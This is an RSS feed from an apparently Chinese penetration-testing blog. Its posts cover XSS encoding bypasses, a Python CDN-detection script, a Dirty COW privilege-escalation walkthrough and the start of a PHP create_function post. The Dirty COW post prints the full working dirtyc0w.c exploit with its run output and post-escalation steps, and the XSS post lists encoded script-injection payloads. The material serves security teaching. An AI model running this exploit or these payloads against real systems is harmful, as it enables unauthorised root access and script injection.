<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pentest on </title>
    <link>http://wyb0.com/topics/pentest/</link>
    <description>Recent content in Pentest on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Thu, 30 Mar 2017 15:25:37 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/topics/pentest/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>XSS中的编码</title>
      <link>http://wyb0.com/posts/XSS%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/XSS%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime006.jpg&#34; alt=&#34;攻壳机动队&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-浏览器解析:353777dbcb24004a0a78c26e7d5cff00&#34;&gt;0x00 浏览器解析&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时，会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容，对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本，在这之前它是HTML的一部分
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-一些编码:353777dbcb24004a0a78c26e7d5cff00&#34;&gt;0x01 一些编码&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;URL编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;HTML编码&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;实体编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;字符编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码
如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;JS编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot;
2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot;
3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot;
4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;CSS编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-编码与解码顺序:353777dbcb24004a0a78c26e7d5cff00&#34;&gt;0x02 编码与解码顺序&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;解码时先解码最外层，编码时先编码最内层&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;，
首先value出现在url中，而url在js中，而js又是html一部分，所以
解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码
编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-利用:353777dbcb24004a0a78c26e7d5cff00&#34;&gt;0x03 利用&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;八进制&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;;
var p = document.getElementById(&#39;test&#39;); #这里会进行js解码
p.innerHTML = test;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;十进制和十六进制&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;img src=x onerror=&amp;quot;\u0061\u006c\u0065\u0072\u0074(1)&amp;quot;&amp;gt;
&amp;lt;img src=x onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;javascript协议&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;xxx&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;data协议&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;xxxxxx&amp;lt;/a&amp;gt;
&amp;lt;a href=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;111&amp;lt;/a&amp;gt;
&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;html5新增实体编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;javasc&amp;amp;NewLine;ript&amp;amp;colon;alert(1)&amp;quot;&amp;gt;aaaa&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;多次编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;点击后跳转到url，进行url解码
&amp;lt;a href=&amp;quot;javascript:%61lert(1)&amp;quot;&amp;gt;xxxx&amp;lt;/a&amp;gt;
先最外围的html解码，然后href里的url解码
&amp;lt;a href=&amp;quot;j&amp;amp;#x0061;vascript:&amp;amp;#x25;61lert(1)&amp;quot;&amp;gt;click me&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Python实现CDN的判断</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0CDN%E7%9A%84%E5%88%A4%E6%96%AD/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0CDN%E7%9A%84%E5%88%A4%E6%96%AD/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime002.jpg&#34; alt=&#34;银魂&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-什么是cdn:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x00 什么是CDN&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容，
运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的
缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点，
你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-判断方法:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x01 判断方法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;可以查询CNAME记录，每个cdn厂商都有特有的特征串&lt;/li&gt;
&lt;li&gt;查看http返回头的头部信息&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-代码:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x02 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;首先安装dnspython这个第三方模块：pip install dnspython&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import dns.resolver
import urllib2
import urlparse

class CdnCheck(object):
    def __init__(self, url):
        super(CdnCheck, self).__init__()
        self.cdninfo()
        self.url = url
        self.cnames = []
        self.headers = []

    def get_cnames(self): # get all cname
        furl = urlparse.urlparse(self.url)
        url = furl.netloc
        # print url

        rsv = dns.resolver.Resolver()
        # rsv.nameservers = [&#39;114.114.114.114&#39;]
        try:
            answer = dns.resolver.query(url,&#39;CNAME&#39;)
        except Exception as e:
            self.cnames = None
            # print &amp;quot;ERROR: %s&amp;quot; % e
        else:
            cname = [_.to_text() for _ in answer][0]
            self.cnames.append(cname)
            self.get_cname(cname)

    def get_cname(self,cname): # get cname
        try:
            answer = dns.resolver.query(cname,&#39;CNAME&#39;)
            cname = [_.to_text() for _ in answer][0]
            self.cnames.append(cname)
            self.get_cname(cname)
        except dns.resolver.NoAnswer:
            pass

    def get_headers(self): # get header
        try:
            resp = urllib2.urlopen(self.url)
        except Exception as e:
            self.headers = None
            # print &amp;quot;ERROR: %s&amp;quot; % e
        else:
            headers = str(resp.headers).lower()
            self.headers = headers

    def matched(self, context, *args): # Matching string 
        if not isinstance(context, basestring):
            context = str(context)

        func = lambda x, y: y in x
        # if any(func(context, pattern) for pattern in args):
        #     return True
        # else:
        #     return False
        for pattern in args:
            if func(context,pattern):
                return pattern
        return False

    def check(self):
        flag = None
        self.get_cnames()
        self.get_headers()
        if self.cnames:
            # print self.cnames
            flag = self.matched(self.cnames,*self.cdn[&#39;cname&#39;])
            if flag:
                return {&#39;Status&#39;:True, &#39;CDN&#39;:self.cdn[&#39;cname&#39;].get(flag)}
        if not flag and self.headers:
            flag = self.matched(self.headers,*self.cdn[&#39;headers&#39;])
            if flag:
                return {&#39;Status&#39;:True, &#39;CDN&#39;:&#39;unknown&#39;}
        return {&#39;Status&#39;:False, &#39;CNAME&#39;:self.cnames, &#39;Headers&#39;:self.headers}

    def cdninfo(self):
        self.cdn = {
            &#39;headers&#39;: set([
                &#39;via&#39;,
                &#39;x-via&#39;,
                &#39;by-360wzb&#39;,
                &#39;by-anquanbao&#39;,
                &#39;cc_cache&#39;,
                &#39;cdn cache server&#39;,
                &#39;cf-ray&#39;,
                &#39;chinacache&#39;,
                &#39;verycdn&#39;
                &#39;webcache&#39;,
                &#39;x-cacheable&#39;,
                &#39;x-fastly&#39;,
                &#39;yunjiasu&#39;,
            ]),
            &#39;cname&#39;: {
                &#39;tbcache.com&#39;:u&#39;taobao&#39;, # 应该是淘宝自己的。。。。
                &#39;tcdn.qq.com&#39;:u&#39;tcdn.qq.com&#39;, # 应该是腾讯的。。。
                &#39;00cdn.com&#39;:u&#39;XYcdn&#39;, # 星域cdn
                &#39;21cvcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21okglb.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21speedcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21vianet.com.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;21vokglb.cn&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;360wzb.com&#39;:u&#39;360&#39;, # 360网站卫士
                &#39;51cdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;acadn.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;aicdn.com&#39;:u&#39;UPYUN&#39;, # 又拍云
                &#39;akadns.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai-staging.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai.com&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamai.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;akamaitech.net&#39;:u&#39;Akamai&#39;, # 易通锐进
                &#39;akamaized.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;alicloudlayer.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;alikunlun.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;aliyun-inc.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;aliyuncs.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;amazonaws.com&#39;:u&#39;Amazon Cloudfront&#39;, # 亚马逊
                &#39;anankecdn.com.br&#39;:u&#39;Ananke&#39;, # Ananke
                &#39;aodianyun.com&#39;:u&#39;VOD&#39;, # 奥点云
                &#39;aqb.so&#39;:u&#39;AnQuanBao&#39;, # 安全宝
                &#39;awsdns&#39;:u&#39;KeyCDN&#39;, # KeyCDN
                &#39;azioncdn.net&#39;:u&#39;Azion&#39;, # Azion
                &#39;azureedge.net&#39;:u&#39;Azure CDN&#39;, # Microsoft Azure
                &#39;bdydns.com&#39;:u&#39;Baiduyun&#39;, # 百度云
                &#39;bitgravity.com&#39;:u&#39;Tata Communications&#39;, # 待定
                &#39;cachecn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;cachefly.net&#39;:u&#39;Cachefly&#39;, # Cachefly
                &#39;ccgslb.com&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;ccgslb.net&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;cdn-cdn.net&#39;:u&#39;&#39;, # 待定
                &#39;cdn.cloudflare.net&#39;:u&#39;CloudFlare&#39;, # CloudFlare
                &#39;cdn.dnsv1.com&#39;:u&#39;Tengxunyun&#39;, # 腾讯云
                &#39;cdn.ngenix.net&#39;:u&#39;&#39;, # 待定
                &#39;cdn20.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;cdn77.net&#39;:u&#39;CDN77&#39;, # CDN77
                &#39;cdn77.org&#39;:u&#39;CDN77&#39;, # CDN77
                &#39;cdnetworks.net&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;cdnify.io&#39;:u&#39;CDNify&#39;, # CDNify
                &#39;cdnnetworks.com&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;cdnsun.net&#39;:u&#39;CDNsun&#39;, # CDNsun
                &#39;cdntip.com&#39;:u&#39;QCloud&#39;, # 腾讯云
                &#39;cdnudns.com&#39;:u&#39;PowerLeader&#39;, # 宝腾互联
                &#39;cdnvideo.ru&#39;:u&#39;CDNvideo&#39;, # CDNvideo
                &#39;cdnzz.net&#39;:u&#39;SuZhi&#39;, # 速致
                &#39;chinacache.net&#39;:u&#39;ChinaCache&#39;, # 蓝汛科技
                &#39;chinaidns.net&#39;:u&#39;LineFuture&#39;, # 澜景网络
                &#39;chinanetcenter.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;cloudcdn.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;cloudfront.net&#39;:u&#39;Amazon Cloudfront&#39;, # Amazon
                &#39;customcdn.cn&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;customcdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;dnion.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;dnspao.com&#39;:u&#39;&#39;, # 待定
                &#39;edgecastcdn.net&#39;:u&#39;EdgeCast&#39;, # EdgeCast
                &#39;edgesuite.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;ewcache.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;fastcache.com&#39;:u&#39;FastCache&#39;, # 速网科技
                &#39;fastcdn.cn&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;fastly.net&#39;:u&#39;Fastly&#39;, # Fastly
                &#39;fastweb.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;fastwebcdn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;footprint.net&#39;:u&#39;Level3&#39;, # Level3
                &#39;fpbns.net&#39;:u&#39;Level3&#39;, # Level3
                &#39;fwcdn.com&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;fwdns.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;globalcdn.cn&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;hacdn.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;hadns.net&#39;:u&#39;CnKuai&#39;, # 快网
                &#39;hichina.com&#39;:u&#39;WWW&#39;, # 万网
                &#39;hichina.net&#39;:u&#39;WWW&#39;, # 万网
                &#39;hwcdn.net&#39;:u&#39;Highwinds&#39;, # Highwinds
                &#39;incapdns.net&#39;:u&#39;Incapsula&#39;, # Incapsula
                &#39;internapcdn.net&#39;:u&#39;Internap&#39;, # Internap
                &#39;jiashule.com&#39;:u&#39;Jiasule&#39;, # 加速乐
                &#39;kunlun.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kunlunar.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kunlunca.com&#39;:u&#39;ALiyun&#39;, # 阿里云
                &#39;kxcdn.com&#39;:u&#39;KeyCDN&#39;, # KeyCDN
                &#39;lswcdn.net&#39;:u&#39;Leaseweb&#39;, # Leaseweb
                &#39;lxcdn.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;lxdns.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;mwcloudcdn.com&#39;:u&#39;QUANTIL&#39;, # QUANTIL
                &#39;netdna-cdn.com&#39;:u&#39;MaxCDN&#39;, # MaxCDN
                &#39;okcdn.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;okglb.com&#39;:u&#39;21Vianet&#39;, # 世纪互联
                &#39;ourwebcdn.net&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;ourwebpic.com&#39;:u&#39;ChinaCache&#39;, # 网宿科技
                &#39;presscdn.com&#39;:u&#39;Presscdn&#39;, # Presscdn
                &#39;qingcdn.com&#39;:u&#39;&#39;, # 待定
                &#39;qiniudns.com&#39;:u&#39;QiNiu&#39;, # 七牛云
                &#39;skyparkcdn.net&#39;:u&#39;&#39;, # 待定
                &#39;speedcdns.com&#39;:u&#39;QUANTIL&#39;, # QUANTIL
                &#39;sprycdn.com&#39;:u&#39;PowerLeader&#39;, # 宝腾互联
                &#39;tlgslb.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;txcdn.cn&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;txnetworks.cn&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;ucloud.cn&#39;:u&#39;UCloud&#39;, # UCloud
                &#39;unicache.com&#39;:u&#39;LineFuture&#39;, # 澜景网络
                &#39;verygslb.com&#39;:u&#39;VeryCloud&#39;, # 云端网络
                &#39;vo.llnwd.net&#39;:u&#39;Limelight&#39;, # Limelight
                &#39;wscdns.com&#39;:u&#39;ChinaNetCenter&#39;, # 网宿科技
                &#39;wscloudcdn.com&#39;:u&#39;ChinaNetCenter&#39;, # 网宿科技
                &#39;xgslb.net&#39;:u&#39;Webluker&#39;, # WebLuker
                &#39;ytcdn.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;yunjiasu-cdn&#39;:u&#39;Baiduyun&#39;, # 百度云加速
            }
        }


if __name__ == &#39;__main__&#39;:
    # url = &amp;quot;http://www.reber-9.com&amp;quot;
    url = sys.argv[1]
    cdn = CdnCheck(url)
    print cdn.check()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-结果:d1a4b4dae5b2cfc1df372c64e29e9ea6&#34;&gt;0x03 结果&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;结果如下：
C:\Users\WYB_9\Desktop&amp;gt;python check_cdn.py http://www.reber-9.com
{&#39;Status&#39;: True, &#39;CDN&#39;: u&#39;Baiduyun&#39;}

C:\Users\WYB_9\Desktop&amp;gt;python check_cdn.py http://v.ifeng.com
{&#39;Status&#39;: True, &#39;CDN&#39;: u&#39;ChinaCache&#39;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>脏牛漏洞</title>
      <link>http://wyb0.com/posts/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E/</guid>
      <description>

&lt;h3 id=&#34;0x00-测试环境:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x00 测试环境&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;CentOS release 6.5
[reber123@WYB ~]$ uname -a
Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[reber123@WYB ~]$ id
uid=502(reber123) gid=502(reber123) groups=502(reber123)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-创建文件:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x01 创建文件&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;查看文件权限信息，可以看到属主为root，且只读，权限为0404&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber123@WYB ~]$ ls -al test
-r-----r-- 1 root root 19 Oct 21 00:02 test
[reber123@WYB ~]$ cat test
this is not a test
[reber123@WYB ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-编译-执行poc:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x02 编译、执行poc&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;POC保存为a.c，编译为aaa&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber123@WYB ~]$ gcc -lpthread a.c -o aaa
[reber123@WYB ~]$ ls
aaa  a.c  test
[reber123@WYB ~]$

更改test的内容
[reber123@WYB ~]$ ./aaa test xxxxxxxxxxx
mmap f8969000

^C
[reber123@WYB ~]$ cat test
xxxxxxxxxxx a test
[reber123@WYB ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-后续利用:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x03 后续利用&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;更改用户gid为0即可

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dirty_cow1.png&#34; alt=&#34;脏牛1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dirty_cow2.png&#34; alt=&#34;脏牛2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;提权后执行下：echo 0 &amp;gt; /proc/sys/vm/dirty_writeback_centisecs 
用来关闭pdflush刷新,否则提权后过几秒系统就会卡死
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-附poc:86b2477d14edfc02e58f3dd7969f7c8e&#34;&gt;0x04 附poc&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test &amp;gt; foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -lpthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
  
void *map;
int f;
struct stat st;
char *name;
  
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i&amp;lt;100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ... 06661
&amp;gt; This is achieved by racing the madvise(MADV_DONTNEED) system call
&amp;gt; while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf(&amp;quot;madvise %d\n\n&amp;quot;,c);
}
  
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/sh ... 23c16
&amp;gt;  The in the wild exploit we are aware of doesn&#39;t work on Red Hat
&amp;gt;  Enterprise Linux 5 and 6 out of the box because on one side of
&amp;gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not
&amp;gt;  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open(&amp;quot;/proc/self/mem&amp;quot;,O_RDWR);
  int i,c=0;
  for(i=0;i&amp;lt;100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf(&amp;quot;procselfmem %d\n\n&amp;quot;, c);
}
  
  
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc&amp;lt;3)return 1;
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&amp;amp;st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
&amp;gt; Create a private copy-on-write mapping.  Updates to the
&amp;gt; mapping are not visible to other processes mapping the same
&amp;gt; file, and are not carried through to the underlying file.  It
&amp;gt; is unspecified whether changes made to the file after the
&amp;gt; mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf(&amp;quot;mmap %x\n\n&amp;quot;,map);
/*
You have to do it on two threads.
*/
  pthread_create(&amp;amp;pth1,NULL,madviseThread,argv[1]);
  pthread_create(&amp;amp;pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>代码执行漏洞2</title>
      <link>http://wyb0.com/posts/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E2/</guid>
      <description>

&lt;p&gt;接着上一篇：&lt;a href=&#34;http://reber-9.com/post/代码执行漏洞/&#34;&gt;http://reber-9.com/post/代码执行漏洞/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x00-函数create-function:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x00 函数create_function()&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;php中的函数create_function()可以创建一个匿名函数，其函数原型如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;string create_function ( string $args , string $code )
其中$args是函数的参数，$code是函数的内容
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞&lt;/p&gt;
&lt;/blockquote&gt;

